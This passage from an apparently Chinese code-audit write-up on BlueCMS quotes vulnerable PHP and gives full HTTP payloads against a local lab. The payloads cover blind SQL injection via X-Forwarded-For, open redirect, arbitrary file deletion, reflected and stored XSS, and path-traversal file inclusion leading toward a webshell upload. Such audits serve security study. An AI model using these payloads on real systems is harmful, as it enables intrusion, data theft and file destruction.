$db-&gt;query($sql);</span><br><span class="line"> <span class="keyword">if</span>($type == <span class="number">1</span>)</span><br><span class="line"> &#123;</span><br><span class="line"> $db-&gt;query(<span class="string">"UPDATE "</span>.table(<span class="string">'article'</span>).<span class="string">" SET comment = comment+1 WHERE id = "</span>.$id);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">elseif</span>($type == <span class="number">0</span>)</span><br><span class="line"> &#123;</span><br><span class="line"> $db-&gt;query(<span class="string">"UPDATE "</span>.table(<span class="string">'post'</span>).<span class="string">" SET comment = comment+1 WHERE post_id = "</span>.$id);</span><br><span class="line"> &#125;</span><br><span class="line"><span class="keyword">if</span>($_CFG[<span class="string">'comment_is_check'</span>] == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">showmsg(<span class="string">'请稍候，您的评论正在审核当中...'</span>,<span class="string">'comment.php?id='</span>.$id.<span class="string">'&amp;type='</span>.$type);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">showmsg(<span class="string">'发布评论成功'</span>,<span class="string">'comment.php?id='</span>.$id.<span class="string">'&amp;type='</span>.$type);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要执行SQL语句所需要控制的变量为<code>$_GET[&#39;act&#39;] == &#39;send&#39;,$_POST[&#39;content&#39;] != &#39;&#39;,</code></p><p>然后分析SQL语句，这是一个<strong>INSERT INTO</strong>语句，注入的方式有挺多种，这里我采用的是通过<code>select case when then else</code>语句进行延时注入的方法，payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /comment.php?act=send HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: bdshare_firstime=1551059496947; PHPSESSID=gv5b2n1b6uk12phkt0fookutc4; BLUE[user_id]=3; BLUE[user_name]=user02; BLUE[user_pwd]=1e6a32c00852bd4dbf303ab4d54a1380; detail=5</span><br><span class="line">X-Forwarded-For:1&apos;+(select case when(ascii(substr(database(),1,1))=98) then sleep(1) else 1 end),&apos;1&apos;)# </span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 28</span><br><span class="line"></span><br><span class="line">id=1&amp;mood=1&amp;comment=1&amp;type=1</span><br></pre></td></tr></table></figure><p>拼接后的sql语句为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> blue_comment (com_id, post_id, user_id, <span class="keyword">type</span>, mood, <span class="keyword">content</span>, pub_date, ip, is_check) <span class="keyword">VALUES</span> (<span class="string">''</span>, <span class="string">'1'</span>, <span class="string">'3'</span>, <span class="string">'1'</span>, <span class="string">'1'</span>, <span class="string">'1'</span>, <span class="string">'1'</span>, <span class="string">'1'</span>+(<span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span>(<span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">98</span>) <span class="keyword">then</span> <span class="keyword">sleep</span>(<span class="number">1</span>) <span class="keyword">else</span> <span class="number">1</span> <span class="keyword">end</span>),<span class="string">'1'</span>)#, <span class="string">'1'</span>)</span><br></pre></td></tr></table></figure><p>之后就是写脚本注入了</p><p>同样的漏洞存在于<code>/include/common.inc.php</code>第四十五行存在通过getip()函数获得的变量<code>$online_ip</code>，跟踪该变量发现<code>/guest_book.php</code>第77-78行同样存在SQL注入漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;INSERT INTO &quot; . table(&apos;guest_book&apos;) . &quot; (id, rid, user_id, add_time, ip, content) VALUES (&apos;&apos;, &apos;$rid&apos;, &apos;$user_id&apos;, &apos;$timestamp&apos;, &apos;$online_ip&apos;, &apos;$content&apos;)&quot;;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> ($act == <span class="string">'send'</span>)</span><br><span class="line">&#123;</span><br><span class="line">$user_id = $_SESSION[<span class="string">'user_id'</span>] ? $_SESSION[<span class="string">'user_id'</span>] : <span class="number">0</span>;</span><br><span class="line">$rid = intval($_POST[<span class="string">'rid'</span>]);</span><br><span class="line"> $content = !<span class="keyword">empty</span>($_POST[<span class="string">'content'</span>]) ? htmlspecialchars($_POST[<span class="string">'content'</span>]) : <span class="string">''</span>;</span><br><span class="line"> $content = nl2br($content);</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">empty</span>($content))</span><br><span class="line"> &#123;</span><br><span class="line"> showmsg(<span class="string">'评论内容不能为空'</span>);</span><br><span class="line"> &#125;</span><br><span class="line">$sql = <span class="string">"INSERT INTO "</span> . table(<span class="string">'guest_book'</span>) . <span class="string">" (id, rid, user_id, add_time, ip, content) </span></span><br><span class="line"><span class="string">VALUES ('', '$rid', '$user_id', '$timestamp', '$online_ip', '$content')"</span>;</span><br><span class="line">$db-&gt;query($sql);</span><br><span class="line">showmsg(<span class="string">'恭喜您留言成功'</span>, <span class="string">'guest_book.php?page_id='</span>.$_POST[<span class="string">'page_id'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /guest_book.php?act=send HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://127.0.0.1/ann.php?cid=1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: bdshare_firstime=1551059496947; PHPSESSID=gv5b2n1b6uk12phkt0fookutc4; detail=5</span><br><span class="line">X-Forwarded-For:1&apos;+(select case when(ascii(substr(database(),1,1))=98) then sleep(1) else 1 end),&apos;1&apos;)# </span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">rid=1&amp;content=1</span><br></pre></td></tr></table></figure><h3 id="3-任意文件跳转漏洞"><a href="#3-任意文件跳转漏洞" class="headerlink" title="3.任意文件跳转漏洞"></a>3.任意文件跳转漏洞</h3><p><code>/user.php</code>文件第112行通过控制变量<code>$from</code>可进行任意文件跳转</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$from = !empty($from) ? base64_decode($from) : &apos;user.php&apos;;</span><br><span class="line">showmsg(&apos;欢迎您 &apos;.$user_name.&apos; 回来，现在将转到...&apos;, $from);</span><br></pre></td></tr></table></figure><p>前面我们已经分析了<strong>showmsg</strong>函数的作用是页面跳转，同时注意这里<code>$from</code>有经过base64解密，我们通过登录用户，抓取登录包，其实就可以发现$from变量，我们假设跳转到根目录下的robots.txt文件，将<code>robots.txt</code>进行base64编码</p><p>payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /user.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 108</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://127.0.0.1/user.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">referer=&amp;user_name=user02&amp;pwd=user02&amp;safecode=xipt&amp;useful_time=604800&amp;submit=%B5%C7%C2%BC&amp;from=cm9ib3RzLnR4dA==&amp;act=do_login</span><br></pre></td></tr></table></figure><p>登录成功后跳转到robots.txt页面</p><h3 id="4-任意文件删除漏洞"><a href="#4-任意文件删除漏洞" class="headerlink" title="4.任意文件删除漏洞"></a>4.任意文件删除漏洞</h3><p><code>/user.php</code>第616行存在未过滤变量<code>$_POST[&#39;lit_pic&#39;]</code>，导致任意文件删除漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_exists(BLUE_ROOT.$_POST[<span class="string">'lit_pic'</span>])) &#123;</span><br><span class="line">@unlink(BLUE_ROOT.$_POST[<span class="string">'lit_pic'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /user.php?act=do_info_edit HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: bdshare_firstime=1551059496947; PHPSESSID=gv5b2n1b6uk12phkt0fookutc4; detail=4</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 58</span><br><span class="line"></span><br><span class="line">post_id=1&amp;title=1&amp;link_man=1&amp;link_phone=1&amp;lit_pic=demo.php</span><br></pre></td></tr></table></figure><p>同样<code>/admin/flash.php</code>第62-63行存在未过滤变量<code>$_POST[&#39;image_path2&#39;]</code>，导致任意文件删除漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(file_exists(BLUE_ROOT.$_POST[<span class="string">'image_path2'</span>]))&#123;</span><br><span class="line">@unlink(BLUE_ROOT.$_POST[<span class="string">'image_path2'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /admin/flash.php?act=do_edit HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: bdshare_firstime=1551059496947; PHPSESSID=gv5b2n1b6uk12phkt0fookutc4; detail=5</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 31</span><br><span class="line"></span><br><span class="line">image_id=1&amp;image_path2=demo.php</span><br></pre></td></tr></table></figure><h3 id="5-反射型XSS"><a href="#5-反射型XSS" class="headerlink" title="5.反射型XSS"></a>5.反射型XSS</h3><p><code>/admin/card.php</code>第57行存在可利用的变量$name导致的反射型xss漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$name=!<span class="keyword">empty</span>($_POST[<span class="string">'name'</span>]) ? trim($_POST[<span class="string">'name'</span>]) : <span class="string">''</span>;</span><br><span class="line">showmsg(<span class="string">'编辑充值卡 '</span>.$name.<span class="string">' 成功'</span>, <span class="string">'card.php'</span>);</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /admin/card.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 99</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://127.0.0.1/admin/card.php?act=edit&amp;id=1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: bdshare_firstime=1551059496947; PHPSESSID=gv5b2n1b6uk12phkt0fookutc4; detail=4; BLUE[user_id]=2; BLUE[user_name]=user01; BLUE[user_pwd]=30f21397b842ad32aaeae277d571edcd</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">name=%3Cscript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E&amp;value=100&amp;price=30&amp;is_close=0&amp;id=1&amp;act=do_edit</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bluecms/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>弹框后跳转至card.php</p><h3 id="6-存储型XSS"><a href="#6-存储型XSS" class="headerlink" title="6.存储型XSS"></a>6.存储型XSS</h3><p>这个漏洞挺难发现的，我也是看别人的文章才学习到的，我们在审计时应该有注意在<code>/user.php</code>中的注册功能下有一个函数<strong>uc_user_register</strong>，跟踪该函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">uc_user_register</span><span class="params">($username, $password, $email, $questionid = <span class="string">''</span>, $answer = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> call_user_func(UC_API_FUNC, <span class="string">'user'</span>, <span class="string">'register'</span>, <span class="keyword">array</span>(<span class="string">'username'</span>=&gt;$username, <span class="string">'password'</span>=&gt;$password, <span class="string">'email'</span>=&gt;$email, <span class="string">'questionid'</span>=&gt;$questionid, <span class="string">'answer'</span>=&gt;$answer));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们应该都会很奇怪这个<strong>UD_API_FUNC</strong>到底是什么鬼，查询一下其实就是一个引擎检查用户输入是否合法返回对应的<strong>uid</strong>，具体我们没必要深究下去，总之他是一个检查机制</p><p>而回到<code>/user.php</code>的编辑个人资料功能的代码下，我们惊奇的发现这个功能里，我们输入修改的资料信息后，直接将信息更新到了数据库中，并没有通过上面那个引擎对我们的输入进行合法性检查，所以我们就可以利用这个功能，进行存储型的XSS攻击</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">POST /user.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 1475</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOit6AnMUCD0FejzB</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://127.0.0.1/user.php?act=my_info</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; BLUE[user_id]=3; BLUE[user_name]=user02; BLUE[user_pwd]=1e6a32c00852bd4dbf303ab4d54a1380; detail=4</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryOit6AnMUCD0FejzB</span><br><span class="line">Content-Disposition: form-data; name=&quot;face_pic1&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryOit6AnMUCD0FejzB</span><br><span class="line">Content-Disposition: form-data; name=&quot;face_pic2&quot;; filename=&quot;&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryOit6AnMUCD0FejzB</span><br><span class="line">Content-Disposition: form-data; name=&quot;birthday&quot;</span><br><span class="line"></span><br><span class="line">2019-03-14</span><br><span class="line">------WebKitFormBoundaryOit6AnMUCD0FejzB</span><br><span class="line">Content-Disposition: form-data; name=&quot;sex&quot;</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line">------WebKitFormBoundaryOit6AnMUCD0FejzB</span><br><span class="line">Content-Disposition: form-data; name=&quot;email&quot;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br><span class="line">------WebKitFormBoundaryOit6AnMUCD0FejzB</span><br><span class="line">Content-Disposition: form-data; name=&quot;msn&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryOit6AnMUCD0FejzB</span><br><span class="line">Content-Disposition: form-data; name=&quot;qq&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryOit6AnMUCD0FejzB</span><br><span class="line">Content-Disposition: form-data; name=&quot;office_phone&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryOit6AnMUCD0FejzB</span><br><span class="line">Content-Disposition: form-data; name=&quot;home_phone&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryOit6AnMUCD0FejzB</span><br><span class="line">Content-Disposition: form-data; name=&quot;mobile_phone&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryOit6AnMUCD0FejzB</span><br><span class="line">Content-Disposition: form-data; name=&quot;address&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryOit6AnMUCD0FejzB</span><br><span class="line">Content-Disposition: form-data; name=&quot;act&quot;</span><br><span class="line"></span><br><span class="line">edit_user_info</span><br><span class="line">------WebKitFormBoundaryOit6AnMUCD0FejzB</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">È·ÈÏÐÞ¸Ä</span><br><span class="line">------WebKitFormBoundaryOit6AnMUCD0FejzB</span><br><span class="line">Content-Disposition: form-data; name=&quot;face_pic3&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryOit6AnMUCD0FejzB--</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bluecms/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>编辑成功后跳转回用户信息界面，每次访问都会触发弹框，因为我们编辑用户邮箱为<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p><h3 id="7-任意文件包含漏洞"><a href="#7-任意文件包含漏洞" class="headerlink" title="7.任意文件包含漏洞"></a>7.任意文件包含漏洞</h3><p>这个漏洞也是通过审计工具才知道的，在<code>/user.php</code>第750行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> ($act == <span class="string">'pay'</span>)&#123;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'data/pay.cache.php'</span>;</span><br><span class="line">$price = $_POST[<span class="string">'price'</span>];</span><br><span class="line">$id = $_POST[<span class="string">'id'</span>];</span><br><span class="line">$name = $_POST[<span class="string">'name'</span>];</span><br><span class="line"> <span class="keyword">if</span> (<span class="keyword">empty</span>($_POST[<span class="string">'pay'</span>])) &#123;</span><br><span class="line"> showmsg(<span class="string">'对不起，您没有选择支付方式'</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">include</span> <span class="string">'include/payment/'</span>.$_POST[<span class="string">'pay'</span>].<span class="string">"/index.php"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>变量<code>$_POST[&#39;pay&#39;]</code>拼接到include函数中，且只有开头包含文件的转义过滤处理，我们可以使用<code>0x00</code>或文件长度截断方式进行过滤，本次审计的环境是<strong>PHP5.2.17</strong>，如果环境为5.4以上那么上述两种方法无效，不存在任意文件包含漏洞，但是为了更好理解漏洞，我还是将环境设为5.3以下</p><p>包含根目录下<strong>robots.txt</strong>的payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /user.php?act=pay HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; detail=1; BLUE[user_id]=4; BLUE[user_name]=user03; BLUE[user_pwd]=25f1d8643365bf6087fae3b2b5b012d6</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 632</span><br><span class="line"></span><br><span class="line">pay=../../robots.txtspan><br></pre></td></tr></table></figure><p>这里我使用了字符<code>.</code>来进行文件长度截断</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bluecms/12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>有了文件包含漏洞，我们接着就可以考虑是不是上传图片马，这样就能成功执行<strong>shell</strong>，所以接下来我们找一个可以上传文件的页面：<code>/admin/flash.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span>($act == <span class="string">'do_add'</span>)&#123;</span><br><span class="line"> $image_link = !<span class="keyword">empty</span>($_POST[<span class="string">'image_link'</span>]) ? trim($_POST[<span class="string">'image_link'</span>]) : <span class="string">''</span>;</span><br><span class="line"> $show_order = !<span class="keyword">empty</span>($_POST[<span class="string">'show_order'</span>]) ? intval($_POST[<span class="string">'showorder'</span>]) : <span class="string">''</span>;</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">'image_path'</span>][<span class="string">'error'</span>]) &amp;&amp; $_FILES[<span class="string">'image_path'</span>][<span class="string">'error'</span>] == <span class="number">0</span>)&#123;</span><br><span class="line">$image_path = $image-&gt;img_upload($_FILES[<span class="string">'image_path'</span>],<span class="string">'flash'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($image_path == <span class="string">''</span>)&#123;</span><br><span 